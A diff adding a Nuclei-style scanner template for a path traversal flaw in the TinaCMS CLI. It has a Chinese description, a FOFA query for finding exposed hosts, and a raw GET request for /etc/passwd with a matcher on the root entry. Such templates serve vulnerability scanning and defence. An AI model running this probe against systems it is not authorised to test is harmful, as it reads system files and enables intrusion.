@@ -1,0 +1,25 @@
+id: tina-cms-cli-path-traversal
+
+info:
+  name: "TinaCMSCLI路径穿越致敏感文件泄露漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="TinaCMS" || body="tinacms"
+
+    该漏洞允许攻击者通过构造恶意请求实现路径穿越，可能导致敏感文件泄露或系统被非法访问。
+  tags: TinaCMS
+
+http:
+- raw:
+  - |
+    GET /etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+      - "root:[x*]:0:0"
